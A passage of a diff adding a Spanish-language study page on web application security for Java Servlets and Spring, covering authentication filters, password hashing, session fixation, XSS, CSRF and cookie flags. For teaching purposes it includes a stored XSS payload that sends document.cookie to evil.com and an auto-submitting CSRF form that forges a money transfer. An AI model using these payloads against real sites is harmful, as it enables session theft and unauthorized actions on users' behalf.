+&#125;</code></pre>
+    </div>
+
+    <p>En Spring (P5/P6) el filtro es un <code>@Component</code> que implementa <code>jakarta.servlet.Filter</code> o extiende <code>OncePerRequestFilter</code>. La lógica es idéntica; cambia el mecanismo de registro.</p>
+
+    <p>El método <code>getSession(false)</code> es importante en el filtro por dos razones: evita crear sesiones vacías para usuarios no autenticados (lo que consumiría memoria y podría facilitar ataques de denegación de servicio), y además permite detectar correctamente que no hay sesión activa, distinto de que la sesión exista pero esté vacía.</p>
+
+    <div class="callout callout-warning">
+      <p>Usar <code>getSession(false)</code> en el filtro es crítico: evita crear sesiones vacías para todos los usuarios no autenticados. Crear sesiones innecesariamente consume memoria y puede facilitar ataques de denegación de servicio.</p>
+    </div>
+
+    <h3>El controlador de login</h3>
+
+    <div class="code-block">
+      <div class="code-header">java</div>
+<pre><code>// Mostrar formulario de login
+@GetMapping("/login")
+public String showLogin() &#123;
+    return "login";  // → templates/login.html
+&#125;
+
+// Procesar credenciales
+@PostMapping("/login")
+public String processLogin(String username, String password, HttpSession session) &#123;
+
+    Usuario usuario = usuarioService.findByCredentials(username, password);
+
+    if (usuario == null) &#123;
+        return "redirect:/login?error=1";  // credenciales incorrectas
+    &#125;
+
+    // Login correcto → guardar principal en sesión
+    session.setAttribute("user", usuario);
+
+    // Redirigir a la URL original o a la raíz si no había returnUrl
+    String returnUrl = (String) session.getAttribute("returnUrl");
+    session.removeAttribute("returnUrl");  // limpiar después de usar — no reutilizar
+    return "redirect:" + (returnUrl != null ? returnUrl : "/");
+&#125;</code></pre>
+    </div>
+
+    <h3>Hashing de contraseñas</h3>
+
+    <p>Las contraseñas nunca se almacenan en texto plano. Si la BD se ve comprometida, las contraseñas en claro quedan expuestas directamente. El estándar es almacenar el hash de la contraseña, de forma que la comparación sea: <code>hash(passwordRecibida) == hashAlmacenado</code>.</p>
+
+    <p>Algoritmos adecuados para contraseñas: <strong>bcrypt</strong> (más recomendado hoy: incorpora salt automático y es lento por diseño, lo que dificulta ataques de fuerza bruta), <strong>Argon2</strong>, o SHA-256 con salt manual. MD5 y SHA-1 solos están <strong>prohibidos</strong> para contraseñas: son demasiado rápidos, lo que facilita ataques de diccionario.</p>
+
+    <div class="code-block">
+      <div class="code-header">java</div>
+<pre><code>// El servicio de login no compara texto plano
+public Usuario findByCredentials(String username, String rawPassword) &#123;
+
+    Usuario usuario = usuarioRepo.findByUsername(username);
+    if (usuario == null) return null;
+
+    // Comparar el hash, no la contraseña en texto plano
+    // BCryptPasswordEncoder (Spring Security) o equivalente
+    if (!passwordEncoder.matches(rawPassword, usuario.getPasswordHash())) &#123;
+        return null;  // contraseña incorrecta
+    &#125;
+
+    return usuario;
+&#125;</code></pre>
+    </div>
+
+    <div class="callout callout-key">
+      <p>Nunca almacenar contraseñas en texto plano. El servidor solo necesita saber si la contraseña es correcta, no cuál es. <code>bcrypt(password) != password_original</code> es imposible de revertir eficientemente.</p>
+    </div>
+
+    <div class="callout callout-tip">
+      <p>En el JDBCRealm de Tomcat (visto en la sección de seguridad declarativa), la configuración <code>algorithm='SHA'</code> hace exactamente esto: compara <code>SHA(passwordRecibida)</code> contra el hash almacenado en la columna <code>password</code> de la tabla de usuarios.</p>
+    </div>
+
+    <h3>Logout</h3>
+
+    <div class="callout callout-warning">
+      <p>El logout debe implementarse como POST, no GET. Con GET, cualquier página externa puede incluir <code>&lt;img src="/logout"&gt;</code> y desloguear al usuario sin su consentimiento. Es un CSRF de logout. El formulario de logout en la vista debe usar <code>method="post"</code>.</p>
+    </div>
+
+    <div class="code-block">
+      <div class="code-header">java</div>
+<pre><code>// Logout — debe ser POST para evitar CSRF (un &lt;img src="/logout"&gt; desloguearía al usuario)
+@PostMapping("/logout")
+public String logout(HttpSession session) &#123;
+    session.invalidate();  // destruye la sesión y todos sus atributos
+    return "redirect:/login";
+&#125;</code></pre>
+    </div>
+
+    <h3>Session fixation: regenerar la sesión en el login</h3>
+
+    <p>Si el atacante consigue que la víctima inicie una sesión con un <code>sessionId</code> fijado (por ejemplo, poniendo <code>sessionId=atacante_conoce_este_valor</code> en una URL), cuando la víctima se autentique, ese <code>sessionId</code> conocido quedará asociado a una sesión autenticada. La solución es invalidar la sesión actual y crear una nueva inmediatamente después de autenticar:</p>
+
+    <div class="code-block">
+      <div class="code-header">java</div>
+<pre><code>@PostMapping("/login")
+public String processLogin(String username, String password, HttpServletRequest request) &#123;
+
+    Usuario usuario = usuarioService.findByCredentials(username, password);
+    if (usuario == null) &#123;
+        return "redirect:/login?error=1";
+    &#125;
+
+    // Guardar returnUrl ANTES de invalidar la sesión
+    HttpSession oldSession = request.getSession(false);
+    String returnUrl = (oldSession != null)
+            ? (String) oldSession.getAttribute("returnUrl")
+            : null;
+
+    // Invalidar la sesión existente y crear una nueva (previene session fixation)
+    if (oldSession != null) &#123;
+        oldSession.invalidate();
+    &#125;
+    HttpSession newSession = request.getSession(true);  // sesión nueva, sessionId nuevo
+
+    // Guardar el usuario en la sesión nueva
+    newSession.setAttribute("user", usuario);
+
+    return "redirect:" + (returnUrl != null ? returnUrl : "/");
+&#125;</code></pre>
+    </div>
+
+    <div class="callout callout-key">
+      <p>Regenerar la sesión en cada login es una buena práctica de seguridad. El <code>sessionId</code> de antes del login no debe seguir siendo válido después: un atacante que lo conocía no debe poder aprovecharse de que el usuario se haya autenticado.</p>
+    </div>
+
+    <div class="callout callout-key">
+      <p>El filtro es el guardián centralizado. Sin él, cada controlador del área protegida tendría que verificar la sesión individualmente — propenso a olvidarse en algún endpoint. El filtro aplica el principio DRY a la seguridad: la comprobación se hace una sola vez, en un solo lugar.</p>
+    </div>
+
+    <div class="callout callout-relation">
+      <p>Relación con Servlets/JSP — Filtros: el patrón <code>doFilter → comprobar → redirigir → chain.doFilter</code> es el mismo que se vio en el bloque anterior. Este bloque aplica ese patrón concreto al caso de autenticación.</p>
+    </div>
+
+    <div class="callout callout-tip">
+      <p>En Spring Security (no visto en prácticas), este filtro es gestionado automáticamente por el framework. El resultado es el mismo: un interceptor centralizado que comprueba la sesión antes de cada petición protegida.</p>
+    </div>
+
+    <h3>Filtro con control de rol</h3>
+
+    <div class="code-block">
+      <div class="code-header">java</div>
+<pre><code>// Filtro que verifica autenticación Y rol de administrador
+@WebFilter("/admin/*")
+public class AdminFilter implements Filter &#123;
+
+    @Override
+    public void doFilter(ServletRequest req, ServletResponse resp, FilterChain chain)
+            throws IOException, ServletException &#123;
+
+        var request  = (HttpServletRequest) req;
+        var response = (HttpServletResponse) resp;
+        HttpSession session = request.getSession(false);
+        Usuario usuario = (session != null) ? (Usuario) session.getAttribute("user") : null;
+
+        if (usuario == null) &#123;
+            // No autenticado → login
+            request.getSession(true).setAttribute("returnUrl", request.getRequestURI());
+            response.sendRedirect(request.getContextPath() + "/login");
+            return;
+        &#125;
+
+        if (!"administrador".equals(usuario.getRol())) &#123;
+            // Autenticado pero sin el rol necesario → 403
+            response.sendError(403);
+            return;
+        &#125;
+
+        chain.doFilter(request, response);
+    &#125;
+&#125;</code></pre>
+    </div>
+
+    <div class="callout callout-key">
+      <p>La diferencia entre autenticación y autorización en el filtro: comprobar que la sesión no es null es autenticación. Comprobar que el usuario tiene el rol correcto es autorización. Un filtro puede hacer las dos cosas.</p>
+    </div>
+  </section>
+
+  <!-- ===== SECCIÓN 5: CSRF Y XSS ===== -->
+  <section id="csrf-xss">
+    <h2>CSRF y XSS</h2>
+
+    <div class="callout callout-examen">
+      <p>Peso ALTO. El profesor pide saber qué son y por qué son un problema. No hace falta implementar mitigaciones en detalle; sí entender el vector de ataque de cada uno y la diferencia entre ambos.</p>
+    </div>
+
+    <h3>Cross-Site Scripting (XSS)</h3>
+
+    <p>XSS es un ataque en el que el atacante consigue inyectar código JavaScript malicioso en una página web que otros usuarios legítimos visualizan. El navegador de la víctima ejecuta ese script porque lo recibe desde un servidor de confianza, sin saber que el contenido es malicioso.</p>
+
+    <p>Hay tres variantes:</p>
+    <ul>
+      <li><strong>XSS reflejado</strong>: el payload llega en un parámetro de URL o de formulario; el servidor lo incluye directamente en la respuesta sin sanitizar; el script se ejecuta solo para ese usuario.</li>
+      <li><strong>XSS persistente (almacenado)</strong>: el payload se guarda en la BD (comentario, nombre de perfil...); cada usuario que carga esa página ejecuta el script. Es el más peligroso.</li>
+      <li><strong>XSS basado en DOM</strong>: el payload está en el fragmento de URL (<code>#payload</code>) o en otro parámetro que <strong>nunca llega al servidor</strong>. JavaScript de la propia página lo lee (p. ej. con <code>location.hash</code>) y lo inyecta en el DOM sin sanitizar. No hay registro en logs del servidor porque el servidor nunca lo vio.</li>
+    </ul>
+
+    <p>El DOM-based es el más difícil de detectar: el servidor no puede validar ni registrar un payload que nunca le llega. La mitigación sigue siendo la misma: no inyectar datos no confiables en el DOM directamente. En JavaScript: usar <code>element.textContent</code> en lugar de <code>element.innerHTML</code>.</p>
+
+    <!-- SVG: Ataque XSS persistente -->
+    <svg viewBox="0 0 760 280" xmlns="http://www.w3.org/2000/svg" style="width:100%;max-width:760px;display:block;margin:var(--space-5) 0;">
+      <defs>
+        <marker id="arrXss" markerWidth="8" markerHeight="8" refX="6" refY="3" orient="auto">
+          <path d="M0,0 L0,6 L8,3 z" fill="var(--color-text-3)"/>
+        </marker>
+        <marker id="arrXssR" markerWidth="8" markerHeight="8" refX="6" refY="3" orient="auto">
+          <path d="M0,0 L0,6 L8,3 z" fill="oklch(55% 0.15 20)"/>
+        </marker>
+      </defs>
+
+      <!-- Actores -->
+      <text x="80"  y="22" text-anchor="middle" font-family="var(--font-display)" font-size="12" font-weight="600" fill="var(--color-text-2)">Atacante</text>
+      <line x1="80"  y1="28" x2="80"  y2="270" stroke="var(--color-border)" stroke-width="1" stroke-dasharray="4,3"/>
+      <text x="380" y="22" text-anchor="middle" font-family="var(--font-display)" font-size="12" font-weight="600" fill="var(--color-text-2)">Servidor / BD</text>
+      <line x1="380" y1="28" x2="380" y2="270" stroke="var(--color-border)" stroke-width="1" stroke-dasharray="4,3"/>
+      <text x="650" y="22" text-anchor="middle" font-family="var(--font-display)" font-size="12" font-weight="600" fill="var(--color-text-2)">Víctima</text>
+      <line x1="650" y1="28" x2="650" y2="270" stroke="var(--color-border)" stroke-width="1" stroke-dasharray="4,3"/>
+
+      <!-- Fase 1: Inyección -->
+      <text x="8" y="48" font-family="var(--font-display)" font-size="9" font-weight="600" fill="var(--color-warning-text)">Inyección</text>
+      <line x1="80" y1="56" x2="378" y2="56" stroke="var(--color-text-3)" stroke-width="1.5" marker-end="url(#arrXss)"/>
+      <text x="229" y="50" text-anchor="middle" font-family="var(--font-display)" font-size="9" fill="var(--color-text-3)">POST /comentarios</text>
+
+      <rect x="185" y="64" width="390" height="38" rx="4" fill="var(--color-warning-bg)" stroke="var(--color-warning-border)" stroke-width="1"/>
+      <text x="215" y="78" font-family="var(--font-display)" font-size="8" font-weight="600" fill="var(--color-warning-text)">Almacenado en BD</text>
+      <text x="380" y="94" text-anchor="middle" font-family="var(--font-mono)" font-size="9" fill="var(--color-warning-text)">&lt;script&gt;fetch('evil.com?c='+document.cookie)&lt;/script&gt;</text>
+
+      <rect x="310" y="110" width="140" height="26" rx="4" fill="var(--color-surface-2)" stroke="var(--color-border)" stroke-width="1"/>
+      <text x="380" y="127" text-anchor="middle" font-family="var(--font-display)" font-size="9" fill="var(--color-text-2)">Guarda en BD sin escapar</text>
+
+      <!-- Separador -->
+      <line x1="0" y1="148" x2="760" y2="148" stroke="var(--color-border)" stroke-width="1" stroke-dasharray="6,4"/>
+      <text x="8" y="165" font-family="var(--font-display)" font-size="9" font-weight="600" fill="oklch(55% 0.15 20)">Ejecución</text>
+
+      <!-- Fase 2: Ejecución -->
+      <line x1="378" y1="172" x2="648" y2="172" stroke="var(--color-text-3)" stroke-width="1.5" marker-end="url(#arrXss)"/>
+      <text x="514" y="166" text-anchor="middle" font-family="var(--font-display)" font-size="9" fill="oklch(55% 0.15 20)">Ejecutado por todos los visitantes</text>
+
+      <rect x="590" y="178" width="120" height="28" rx="4" fill="oklch(97% 0.03 20 / 0.4)" stroke="oklch(55% 0.15 20)" stroke-width="1"/>
+      <text x="650" y="193" text-anchor="middle" font-family="var(--font-display)" font-size="9" fill="oklch(55% 0.15 20)">Ejecuta el script</text>
+      <text x="650" y="205" text-anchor="middle" font-family="var(--font-mono)" font-size="8" fill="oklch(55% 0.15 20)">(Navegador víctima)</text>
+
+      <line x1="648" y1="210" x2="712" y2="235" stroke="oklch(55% 0.15 20)" stroke-width="1.5" marker-end="url(#arrXssR)"/>
+      <rect x="710" y="232" width="42" height="22" rx="3" fill="var(--color-warning-bg)" stroke="var(--color-warning-border)" stroke-width="1"/>
+      <text x="731" y="247" text-anchor="middle" font-family="var(--font-mono)" font-size="8" fill="var(--color-warning-text)">evil.com</text>
+
+      <line x1="710" y1="243" x2="652" y2="258" stroke="oklch(55% 0.15 20)" stroke-width="1" stroke-dasharray="3,2"/>
+      <text x="680" y="268" text-anchor="middle" font-family="var(--font-display)" font-size="8" fill="oklch(55% 0.15 20)">Secuestra la sesión</text>
+    </svg>
+
+    <p>El antídoto es escapar toda salida que provenga de datos del usuario. En Thymeleaf, <code>th:text</code> escapa automáticamente; <code>th:utext</code> no lo hace y debe evitarse con datos del usuario. En JSP, <code>&lt;c:out&gt;</code> escapa por defecto.</p>
+
+    <div class="callout callout-warning">
+      <p>Nunca usar <code>th:utext</code> con datos del usuario. Una sola salida sin escapar puede comprometer la sesión de todos los usuarios de la aplicación.</p>
+    </div>
+
+    <h3>Cross-Site Request Forgery (CSRF)</h3>
+
+    <p>CSRF explota el hecho de que el navegador envía automáticamente las cookies de sesión con cada petición al dominio correspondiente. Si el usuario está autenticado en <code>site-A</code> y visita <code>site-B</code> malicioso, <code>site-B</code> puede incluir código HTML que hace que el navegador del usuario envíe peticiones a <code>site-A</code> con la sesión activa, sin que el usuario lo sepa.</p>
+
+    <p>El ataque no roba credenciales ni la sesión; "secuestra" la autorización de una sesión ya establecida para ejecutar acciones en nombre del usuario.</p>
+
+    <!-- SVG: Ataque CSRF -->
+    <svg viewBox="0 0 760 280" xmlns="http://www.w3.org/2000/svg" style="width:100%;max-width:760px;display:block;margin:var(--space-5) 0;">
+      <defs>
+        <marker id="arrCsrfN" markerWidth="8" markerHeight="8" refX="6" refY="3" orient="auto">
+          <path d="M0,0 L0,6 L8,3 z" fill="var(--color-text-3)"/>
+        </marker>
+        <marker id="arrCsrfR" markerWidth="8" markerHeight="8" refX="6" refY="3" orient="auto">
+          <path d="M0,0 L0,6 L8,3 z" fill="oklch(55% 0.15 20)"/>
+        </marker>
+      </defs>
+
+      <!-- Actores -->
+      <text x="90"  y="22" text-anchor="middle" font-family="var(--font-display)" font-size="11" font-weight="600" fill="var(--color-text-2)">Usuario (autenticado)</text>
+      <line x1="90"  y1="28" x2="90"  y2="270" stroke="var(--color-border)" stroke-width="1" stroke-dasharray="4,3"/>
+      <text x="380" y="22" text-anchor="middle" font-family="var(--font-display)" font-size="11" font-weight="600" fill="var(--color-text-2)">Site-B malicioso</text>
+      <line x1="380" y1="28" x2="380" y2="270" stroke="var(--color-border)" stroke-width="1" stroke-dasharray="4,3"/>
+      <text x="660" y="22" text-anchor="middle" font-family="var(--font-display)" font-size="11" font-weight="600" fill="var(--color-text-2)">Servidor site-A</text>
+      <line x1="660" y1="28" x2="660" y2="270" stroke="var(--color-border)" stroke-width="1" stroke-dasharray="4,3"/>
+
+      <!-- Paso 1: sesión activa -->
+      <rect x="30" y="36" width="120" height="22" rx="3" fill="var(--color-tip-bg)" stroke="var(--color-tip-border)" stroke-width="1"/>
+      <text x="90" y="51" text-anchor="middle" font-family="var(--font-display)" font-size="9" fill="var(--color-tip-text)">[sesión activa en site-A]</text>
+
+      <!-- Paso 2: visita site-B -->
+      <line x1="90" y1="72" x2="378" y2="72" stroke="var(--color-text-3)" stroke-width="1.5" marker-end="url(#arrCsrfN)"/>
+      <text x="234" y="66" text-anchor="middle" font-family="var(--font-display)" font-size="9" fill="var(--color-text-3)">Visita site-B (email, enlace, anuncio)</text>
+
+      <!-- Site-B responde con trampa -->
+      <rect x="220" y="82" width="320" height="36" rx="4" fill="var(--color-warning-bg)" stroke="var(--color-warning-border)" stroke-width="1"/>
+      <text x="380" y="97" text-anchor="middle" font-family="var(--font-display)" font-size="8" font-weight="600" fill="var(--color-warning-text)">Site-B contiene:</text>
+      <text x="380" y="110" text-anchor="middle" font-family="var(--font-mono)" font-size="8" fill="var(--color-warning-text)">&lt;img src="https://site-a.com/transferir?dest=atacante&amp;monto=1000"&gt;</text>
+
+      <!-- Petición involuntaria -->
+      <line x1="90" y1="140" x2="658" y2="140" stroke="oklch(55% 0.15 20)" stroke-width="1.5" marker-end="url(#arrCsrfR)"/>
+      <text x="374" y="134" text-anchor="middle" font-family="var(--font-display)" font-size="9" fill="oklch(55% 0.15 20)">GET /transferir?... + Cookie: sessionId=abc [automático]</text>
+
+      <rect x="560" y="148" width="200" height="36" rx="4" fill="var(--color-surface-2)" stroke="var(--color-border)" stroke-width="1"/>
+      <text x="660" y="162" text-anchor="middle" font-family="var(--font-display)" font-size="9" fill="var(--color-text)">¿Sesión válida? SÍ</text>
+      <text x="660" y="176" text-anchor="middle" font-family="var(--font-display)" font-size="9" fill="oklch(55% 0.15 20)">Ejecuta transferencia</text>
+
+      <!-- Nota -->
+      <rect x="460" y="198" width="290" height="36" rx="4" fill="oklch(97% 0.03 20 / 0.3)" stroke="oklch(55% 0.15 20)" stroke-width="1"/>
+      <text x="605" y="213" text-anchor="middle" font-family="var(--font-display)" font-size="8" fill="oklch(55% 0.15 20)">El servidor no puede distinguir si</text>
+      <text x="605" y="227" text-anchor="middle" font-family="var(--font-display)" font-size="8" fill="oklch(55% 0.15 20)">el usuario lo pidió voluntariamente</text>
+    </svg>
+
+    <div class="code-block">
+      <div class="code-header">html</div>
+<pre><code>&lt;!-- Variante POST: formulario oculto con autoenvío --&gt;
+&lt;!-- El atacante incluye esto en site-B --&gt;
+&lt;form id="csrf" action="https://site-a.com/transferir" method="POST" style="display:none"&gt;
+  &lt;input type="hidden" name="destino"  value="atacante"&gt;
+  &lt;input type="hidden" name="monto"    value="1000"&gt;
+&lt;/form&gt;
+&lt;script&gt;document.getElementById('csrf').submit();&lt;/script&gt;
+&lt;!-- El navegador envía la cookie de sesión de site-A automáticamente --&gt;</code></pre>
+    </div>
+
+    <p>Con el <code>&lt;img&gt;</code> el atacante solo puede disparar GET. Con el formulario auto-enviado puede disparar POST, que es como se implementan las operaciones que cambian estado (transferencias, borrados, cambios de perfil). La mitigación es la misma: token CSRF.</p>
+
+    <p>La mitigación estándar es el <strong>token CSRF</strong>: el servidor incluye en cada formulario un valor aleatorio secreto que debe estar presente en el POST. Un atacante en site-B no puede conocer ese token porque no puede leer el DOM de site-A (misma política de origen). Spring Security implementa tokens CSRF automáticamente. Los navegadores modernos soportan también el atributo <code>SameSite</code> en las cookies: con <code>SameSite=Strict</code>, el navegador no envía la cookie en peticiones cross-site, lo que elimina CSRF en la mayoría de casos. Con <code>SameSite=Lax</code> (valor por defecto moderno), los GETs de navegación top-level sí envían la cookie, pero los formularios cross-site no.</p>
+
+    <table class="comparison-table">
+      <thead>
+        <tr>
+          <th>Aspecto</th>
+          <th>XSS</th>
+          <th>CSRF</th>
+        </tr>
+      </thead>
+      <tbody>
+        <tr>
+          <td>Qué explota</td>
+          <td>Confianza del navegador en el servidor</td>
+          <td>Confianza del servidor en el navegador autenticado</td>
+        </tr>
+        <tr>
+          <td>Vector de ataque</td>
+          <td>Inyección de scripts en la respuesta del servidor</td>
+          <td>Petición forjada desde un sitio externo</td>
+        </tr>
+        <tr>
+          <td>Objetivo típico</td>
+          <td>Robar cookies de sesión, manipular el DOM</td>
+          <td>Ejecutar acciones no deseadas en nombre del usuario</td>
+        </tr>
+        <tr>
+          <td>¿Requiere sesión activa?</td>
+          <td>No (aunque la aprovecha si existe)</td>
+          <td>Sí — necesita una sesión válida en el navegador</td>
+        </tr>
+        <tr>
+          <td>Cuándo es posible</td>
+          <td>Cuando el servidor no escapa la salida</td>
+          <td>Cuando el servidor no valida el origen de la petición</td>
+        </tr>
+        <tr>
+          <td>Mitigación principal</td>
+          <td>Escapar toda salida con <code>th:text</code> / <code>&lt;c:out&gt;</code></td>
+          <td>Token CSRF en formularios; verificar cabecera <code>Origin</code></td>
+        </tr>
+      </tbody>
+    </table>
+
+    <div class="callout callout-key">
+      <p>CSRF ataca la confianza del servidor en el navegador del usuario. XSS ataca la confianza del navegador en el servidor. Son vectores opuestos: uno forja peticiones, el otro inyecta scripts.</p>
+    </div>
+
+    <div class="callout callout-warning">
+      <p>XSS rompe la defensa de tokens CSRF. Si un atacante logra XSS en site-A, su script puede leer el token CSRF del formulario (<code>document.querySelector('[name=_csrf]').value</code>) e incluirlo en peticiones forjadas. Un XSS existente hace inútiles los tokens CSRF. Por eso XSS tiene prioridad: mitigarlo primero.</p>
+    </div>
+
+    <h3>Flags de cookies de sesión: HttpOnly y Secure</h3>
+
+    <p>La cookie de sesión (la que lleva el <code>sessionId</code>) puede protegerse con dos atributos que el servidor añade en la cabecera <code>Set-Cookie</code>:</p>
+
+    <table class="comparison-table">
+      <thead>
+        <tr>
+          <th>Flag</th>
+          <th>Efecto</th>
+          <th>Qué mitiga</th>
+        </tr>
+      </thead>
+      <tbody>
+        <tr>
+          <td><code>HttpOnly</code></td>
+          <td>JavaScript no puede leer la cookie (<code>document.cookie</code> no la ve)</td>
+          <td>XSS: aunque el atacante inyecte un script, no puede robar el sessionId</td>
+        </tr>
+        <tr>
+          <td><code>Secure</code></td>
+          <td>El navegador solo envía la cookie en conexiones HTTPS</td>
+          <td>Sniffing: la cookie no viaja en claro por HTTP</td>
+        </tr>
+        <tr>
+          <td><code>SameSite=Strict</code></td>
+          <td>El navegador no envía la cookie en peticiones cross-site</td>
+          <td>CSRF: las peticiones forjadas desde site-B no llevan la cookie de site-A</td>
+        </tr>
+        <tr>
+          <td><code>SameSite=Lax</code> (defecto moderno)</td>
+          <td>Como Strict, pero permite GETs de navegación directa</td>
+          <td>CSRF en formularios: equilibrio usabilidad/seguridad</td>
+        </tr>
+      </tbody>
+    </table>
+
+    <div class="callout callout-key">
+      <p>En Tomcat, estos flags se configuran en <code>web.xml</code> dentro de <code>&lt;session-config&gt;</code>: <code>&lt;cookie-config&gt;&lt;http-only&gt;true&lt;/http-only&gt;&lt;secure&gt;true&lt;/secure&gt;&lt;/cookie-config&gt;</code>. Habilitarlos es una decisión de configuración, no de código de aplicación.</p>
+    </div>
+
+    <div class="callout callout-tip">
+      <p>HttpOnly no elimina XSS, pero sí elimina el objetivo más valioso del atacante: robar la cookie de sesión. Un XSS sin acceso a la cookie sigue siendo peligroso (puede manipular el DOM, hacer peticiones en nombre del usuario), pero el impacto es menor.</p>
+    </div>
+  </section>
+
+  <!-- ===== SECCIÓN 6: SEGURIDAD EN CAPAS ===== -->
+  <section id="seguridad-capas">
+    <h2>Seguridad en todas las capas</h2>
+
+    <div class="callout callout-examen">
+      <p>Peso medio. El concepto de seguridad transversal puede aparecer como contexto teórico. Las variables de entorno son un detalle secundario. Estudiar para entender el panorama general.</p>
+    </div>
+
+    <p>La seguridad no es un módulo añadido al final: es una propiedad transversal que debe aplicarse en cada capa de la arquitectura. Una aplicación puede tener el filtro de autenticación perfecto y aun así ser vulnerable si la BD es accesible desde internet o si las contraseñas de producción están en el repositorio.</p>
+
+    <!-- SVG: Amenazas y mitigaciones por capa -->
+    <svg viewBox="0 0 720 340" xmlns="http://www.w3.org/2000/svg" style="width:100%;max-width:720px;display:block;margin:var(--space-5) 0;">
+
+      <!-- Transporte -->
+      <rect x="10"  y="10"  width="160" height="44" rx="4" fill="var(--color-surface)"   stroke="var(--color-border)" stroke-width="1.5"/>
+      <text x="90"  y="27"  text-anchor="middle" font-family="var(--font-display)" font-size="10" font-weight="600" fill="var(--color-text)">Transporte</text>
+      <text x="90"  y="45"  text-anchor="middle" font-family="var(--font-body)"    font-size="9"  fill="var(--color-text-2)">HTTPS/TLS</text>
+      <rect x="180" y="10"  width="240" height="44" rx="4" fill="oklch(97% 0.03 20 / 0.3)" stroke="var(--color-warning-border)" stroke-width="1"/>
+      <text x="300" y="27"  text-anchor="middle" font-family="var(--font-display)" font-size="9"  fill="var(--color-warning-text)">Amenaza</text>
+      <text x="300" y="43"  text-anchor="middle" font-family="var(--font-body)"    font-size="9"  fill="var(--color-warning-text)">Sniffing, credenciales en claro</text>
+      <rect x="430" y="10"  width="280" height="44" rx="4" fill="var(--color-tip-bg)" stroke="var(--color-tip-border)" stroke-width="1"/>
+      <text x="570" y="27"  text-anchor="middle" font-family="var(--font-display)" font-size="9"  fill="var(--color-tip-text)">Mitigación</text>
+      <text x="570" y="43"  text-anchor="middle" font-family="var(--font-body)"    font-size="9"  fill="var(--color-tip-text)">TLS / HTTPS obligatorio</text>
+
+      <!-- Presentación -->
+      <rect x="10"  y="62"  width="160" height="44" rx="4" fill="var(--color-surface-2)" stroke="var(--color-border)" stroke-width="1.5"/>
+      <text x="90"  y="79"  text-anchor="middle" font-family="var(--font-display)" font-size="10" font-weight="600" fill="var(--color-text)">Presentación</text>
+      <text x="90"  y="97"  text-anchor="middle" font-family="var(--font-body)"    font-size="9"  fill="var(--color-text-2)">Thymeleaf / JSP</text>
+      <rect x="180" y="62"  width="240" height="44" rx="4" fill="oklch(97% 0.03 20 / 0.3)" stroke="var(--color-warning-border)" stroke-width="1"/>
+      <text x="300" y="79"  text-anchor="middle" font-family="var(--font-display)" font-size="9"  fill="var(--color-warning-text)">Amenaza</text>
+      <text x="300" y="95"  text-anchor="middle" font-family="var(--font-body)"    font-size="9"  fill="var(--color-warning-text)">XSS, inyección HTML</text>
+      <rect x="430" y="62"  width="280" height="44" rx="4" fill="var(--color-tip-bg)" stroke="var(--color-tip-border)" stroke-width="1"/>
+      <text x="570" y="79"  text-anchor="middle" font-family="var(--font-display)" font-size="9"  fill="var(--color-tip-text)">Mitigación</text>
+      <text x="570" y="95"  text-anchor="middle" font-family="var(--font-body)"    font-size="9"  fill="var(--color-tip-text)">Escapar toda salida (th:text)</text>
+
+      <!-- Controlador/Filtro -->
+      <rect x="10"  y="114" width="160" height="44" rx="4" fill="var(--color-surface)"   stroke="var(--color-border)" stroke-width="1.5"/>
+      <text x="90"  y="131" text-anchor="middle" font-family="var(--font-display)" font-size="10" font-weight="600" fill="var(--color-text)">Controlador/Filtro</text>
+      <text x="90"  y="149" text-anchor="middle" font-family="var(--font-body)"    font-size="9"  fill="var(--color-text-2)">AuthFilter, @Controller</text>
+      <rect x="180" y="114" width="240" height="44" rx="4" fill="oklch(97% 0.03 20 / 0.3)" stroke="var(--color-warning-border)" stroke-width="1"/>
+      <text x="300" y="131" text-anchor="middle" font-family="var(--font-display)" font-size="9"  fill="var(--color-warning-text)">Amenaza</text>
+      <text x="300" y="147" text-anchor="middle" font-family="var(--font-body)"    font-size="9"  fill="var(--color-warning-text)">CSRF, acceso no autorizado a URLs</text>
+      <rect x="430" y="114" width="280" height="44" rx="4" fill="var(--color-tip-bg)" stroke="var(--color-tip-border)" stroke-width="1"/>
+      <text x="570" y="131" text-anchor="middle" font-family="var(--font-display)" font-size="9"  fill="var(--color-tip-text)">Mitigación</text>
+      <text x="570" y="147" text-anchor="middle" font-family="var(--font-body)"    font-size="9"  fill="var(--color-tip-text)">Tokens CSRF, verificación sesión/rol</text>
+
+      <!-- Lógica -->
+      <rect x="10"  y="166" width="160" height="44" rx="4" fill="var(--color-surface-2)" stroke="var(--color-border)" stroke-width="1.5"/>
+      <text x="90"  y="183" text-anchor="middle" font-family="var(--font-display)" font-size="10" font-weight="600" fill="var(--color-text)">Lógica de negocio</text>
+      <text x="90"  y="201" text-anchor="middle" font-family="var(--font-body)"    font-size="9"  fill="var(--color-text-2)">@Service</text>
+      <rect x="180" y="166" width="240" height="44" rx="4" fill="oklch(97% 0.03 20 / 0.3)" stroke="var(--color-warning-border)" stroke-width="1"/>
+      <text x="300" y="183" text-anchor="middle" font-family="var(--font-display)" font-size="9"  fill="var(--color-warning-text)">Amenaza</text>
+      <text x="300" y="199" text-anchor="middle" font-family="var(--font-body)"    font-size="9"  fill="var(--color-warning-text)">Bypass de permisos, datos ajenos</text>
+      <rect x="430" y="166" width="280" height="44" rx="4" fill="var(--color-tip-bg)" stroke="var(--color-tip-border)" stroke-width="1"/>
+      <text x="570" y="183" text-anchor="middle" font-family="var(--font-display)" font-size="9"  fill="var(--color-tip-text)">Mitigación</text>
+      <text x="570" y="199" text-anchor="middle" font-family="var(--font-body)"    font-size="9"  fill="var(--color-tip-text)">Verificar rol + propietario en servicio</text>
+
+      <!-- Acceso a datos -->
+      <rect x="10"  y="218" width="160" height="44" rx="4" fill="var(--color-surface)"   stroke="var(--color-border)" stroke-width="1.5"/>
+      <text x="90"  y="235" text-anchor="middle" font-family="var(--font-display)" font-size="10" font-weight="600" fill="var(--color-text)">Acceso a datos</text>
+      <text x="90"  y="253" text-anchor="middle" font-family="var(--font-body)"    font-size="9"  fill="var(--color-text-2)">DAO / Repository</text>
+      <rect x="180" y="218" width="240" height="44" rx="4" fill="oklch(97% 0.03 20 / 0.3)" stroke="var(--color-warning-border)" stroke-width="1"/>
+      <text x="300" y="235" text-anchor="middle" font-family="var(--font-display)" font-size="9"  fill="var(--color-warning-text)">Amenaza</text>
+      <text x="300" y="251" text-anchor="middle" font-family="var(--font-body)"    font-size="9"  fill="var(--color-warning-text)">SQL Injection</text>
+      <rect x="430" y="218" width="280" height="44" rx="4" fill="var(--color-tip-bg)" stroke="var(--color-tip-border)" stroke-width="1"/>
